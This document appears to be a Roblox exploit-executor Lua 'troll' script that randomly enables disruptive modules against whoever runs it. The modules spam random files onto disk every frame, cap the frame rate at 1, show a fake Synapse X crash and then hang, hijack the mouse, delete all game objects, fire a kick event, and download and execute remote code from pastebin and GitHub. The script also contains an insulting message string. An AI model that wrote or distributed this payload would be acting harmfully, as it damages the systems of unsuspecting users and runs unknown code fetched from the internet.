pcall(function()
local modules = {
    ["ban"] = false,
    ["laggycamera"] = false,
    ["spamfiles"] = false,
    ["fpscap1"] = false,
    ["fakecrash"] = false,
    ["executebloxtap"] = false,
    ["executehexagon"] = false,
    ["executedex"] = false,
    ["pingspikealways"] = false,
    ["teleporttoclowntycoon"] = false,
    ["saveinstance"] = false,
    ["unclosableroblox"] = false,
    ["loudaudio"] = false,
    ["spamrecordings"] = false,
    ["autoclicker"] = false,
    ["akwardmousemovement"] = false,
    ["deleteeverything"] = false,
    ["spamrconsole"] = false,
    ["disableclient"] = false,
}

for i,v in pairs(modules) do
    if math.random(0, 1) == 1 then
        modules[i] = true
    end
end

local random = Random.new()
local letters = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'}

function getRandomLetter()
	return letters[random:NextInteger(1,#letters)]
end

function getRandomString(length, includeCapitals)
	local length = length or 10
	local str = ''
	for i=1,length do
		local randomLetter = getRandomLetter()
		if includeCapitals and random:NextNumber() > .5 then
			randomLetter = string.upper(randomLetter)
		end
		str = str .. randomLetter
	end
	return str
end

local troll = {}
local troll2 = {getRandomString(100, true), getRandomString(100, true), getRandomString(100, true), getRandomString(100, true), getRandomString(100, true), getRandomString(100, true)}

for i = 1, 1000 do
    table.insert(troll, troll2)
end

if modules["ban"] == true then
    pcall(function()
        game.ReplicatedStorage.Events.Respawn:FireServer()
        game.ReplicatedStorage.Events.RemoteEvent:FireServer({"kick", "error 1"})
    end)
end
if modules["laggycamera"] == true then
    local RunService = game:GetService("RunService")
    RunService.RenderStepped:Connect(function()
        if math.random(0, 50) == 3 then
            workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.Position)
        end
    end)
end
if modules["spamfiles"] == true then
    local RunService = game:GetService("RunService")
    RunService.RenderStepped:Connect(function()
        writefile(getRandomString(10, true), troll)
    end)
end
if modules["fpscap1"] == true then
    setfpscap(1)
end
if modules["fakecrash"] == true then
    coroutine.wrap(function()
        messagebox("Synapse X is not currently updated. Please wait for an update to release.", "Synapse X", 0x10)
    end)()
    wait()
    while true do end
end
if modules["executebloxtap"] == true then
    loadstring(game:HttpGet("https://pastebin.com/raw/qMvd6Ccd"))()
end
if modules["executehexagon"] == true then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pawel12d/hexagon/main/scripts/CounterBlox.lua"))()
end
if modules["saveinstance"] == true then
    saveinstance()
end
if modules["loudaudio"] == true then
    for i = 1, 100 do
        local sound = Instance.new("Sound")
        sound.PlayOnRemove = true
        sound.Volume = 10
        sound.Looped = true
        sound.SoundId = "rbxassetid://359949423"
        sound:Destroy()
    end
end
if modules["spamrecordings"] == true then
    
end
if modules["autoclicker"] == true then
    local RunService = game:GetService("RunService")
    RunService.RenderStepped:Connect(function()
        mouse1press()
        wait()
        mouse1release()
    end)
end
if modules["akwardmousemovement"] == true then
    local RunService = game:GetService("RunService")
    RunService.RenderStepped:Connect(function()
        mousescroll(500)
        mousemoveabs(math.random(100, 400), math.random(100, 400))
    end)
end
if modules["deleteeverything"] == true then
    for i,v in pairs(game:GetDescendants()) do
        pcall(function()
            v:Destroy()
        end)
    end
end
if modules["spamrconsole"] == true then
    local RunService = game:GetService("RunService")
    RunService.RenderStepped:Connect(function()
        rconsoleprint(getRandomString(100, true))
    end)
end
if modules["unclosableroblox"] == true then
    local RunService = game:GetService("RunService")
    RunService.RenderStepped:Connect(function()
        messagebox("out gay", "out gay", 0x10)
        game:GetService("GuiService"):ToggleFullscreen()
        mousemoveabs(math.random(100, 400), math.random(100, 400))
    end)
    setfpscap(1)
end
if modules["disableclient"] == true then
    pcall(function()
        game.Players.LocalPlayer.PlayerGui.Client:Destroy()
    end)
end
if modules["teleporttoclowntycoon"] == true then
    game:GetService("TeleportService"):Teleport(964979645)
end
end)
